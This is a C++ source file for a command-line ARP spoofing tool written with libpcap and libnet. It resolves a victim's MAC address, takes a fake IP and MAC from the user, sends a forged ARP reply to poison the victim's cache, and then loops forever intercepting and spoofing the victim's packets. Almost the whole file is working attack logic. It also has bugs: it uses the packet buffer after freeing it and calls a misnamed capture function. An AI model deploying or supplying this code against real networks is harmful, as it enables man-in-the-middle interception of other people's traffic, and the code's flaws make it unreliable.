// arp_main.cpp

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <libnet.h>
#include <string.h>
#include "arp_spoof.h"

void arp_main(u_char *s_mac, u_char *d_mac, struct in_addr s_ip, struct in_addr d_ip, pcap_t *handle)
{
	struct libnet_ethernet_hdr *eth_hdr;	//ethernet header
	struct libnet_arp_hdr *arp_hdr;		//arp hedaer
	struct pcap_pkthdr *header;		//packet header	
	
	const int arp_size = 42;	//arp_packet size (ether + arp)
	//pcap_t *handle = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
	char dev[] = "eth0";
	
	bpf_u_int32 mask;
	bpf_u_int32 net;
	
	u_char *packet;			//For the packet we send
	const u_char *reply;		//For arp reply packet
	
	char tmp_mac[20];
	int tmp_val[6];
	char *fake_mac;
	uint8_t f_mac[6];

	char buf[INET_ADDRSTRLEN];			//For d_ip address
	int index = 0;

	packet = (u_char *)malloc(arp_size);
	
	eth_hdr = (struct libnet_ethernet_hdr *)malloc(sizeof(struct libnet_ethernet_hdr));
	arp_hdr = (struct libnet_arp_hdr *)malloc(sizeof(struct libnet_arp_hdr));
	memset(packet, 0, 42);		//initiallize the packet memory with 0's

	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "%s\n", errbuf);
		exit(1);
	}

	send_arp(packet, s_mac, d_mac, s_ip, d_ip, handle, 1);
	
	while(1)					//Check the packets!
	{
		index++;
		pcap_next_ex(handle, &header, &reply);
		if(get_arp(reply, s_mac, d_mac, d_ip) == 1)	
			break;

		if(index > 50)				//If we check more than 50 packets
		{
			printf("No ARP REPLY packet is captured\n");
			exit(1);
		}
	}

	printf("Victim MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", 
		d_mac[0], d_mac[1], d_mac[2], d_mac[3], d_mac[4], d_mac[5]);
	printf("Victim IP address: %s\n\n", inet_ntop(AF_INET, &d_ip, buf, sizeof(buf)));
	
	puts("Write FAKE IP address: ");
	
	while(1)
	{
		fgets(buf, sizeof(buf), stdin);
		buf[strlen(buf) -1 ] = '\0';

		if(inet_pton(AF_INET, buf, &s_ip.s_addr) == 0)
		{
			printf("Invalid IP address! \n");
			continue;
		}
		else
			break;
	}
	
	puts("Write FAKE MAC address: ");
	
	while(1)
	{
		fgets(tmp_mac, sizeof(tmp_mac), stdin);
		tmp_mac[strlen(tmp_mac) - 1] = '\0';

		if(sscanf(tmp_mac, "%x:%x:%x:%x:%x:%x", 
			&tmp_val[0], &tmp_val[1], &tmp_val[2],
			&tmp_val[3], &tmp_val[4], &tmp_val[5]) < 6)
		{
			printf("Invalid MAC address! (00:00:00:00:00:00) \n");
			continue;
		}
		else
		{
			for (int i = 0; i < 6; i++)
				f_mac[i] = (uint8_t) tmp_val[i];
			break;
		}
	}

	send_arp(packet, f_mac, d_mac, s_ip, d_ip, handle, 2);		//Send fake ARP reply
	
	printf("Send Fake PACKET!!\n");
	printf("\nSpoofing the packets....\n");
	
	free(packet);

	while(1)
	{
		if(packet_next_ex(handle, &header, &packet) <= 0)
			continue;
		else
		{
			packet_spoof(packet, handle, d_ip, d_mac, f_mac);
		}
	}
	
	free(eth_hdr);
	free(arp_hdr);
}



